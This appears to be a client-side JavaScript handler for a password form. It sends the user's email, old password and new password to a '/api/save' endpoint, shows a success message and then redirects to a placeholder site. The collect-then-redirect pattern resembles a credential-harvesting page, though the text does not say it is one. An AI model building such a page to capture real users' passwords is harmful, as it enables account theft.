document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  fetch('/api/save', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      email: email,
      oldPassword: oldPassword,
      newPassword: newPassword
    })
  })
  .then(response => {
    if (response.ok) {
      document.getElementById('passwordForm').style.display = 'none';
      document.getElementById('successMessage').style.display = 'block';
      setTimeout(() => {
        window.location.href = 'https://your-website.com';
      }, 2000);
    } else {
      alert('Something went wrong, please try again.');
    }
  })
  .catch(() => {
    alert('Error sending data.');
  });
});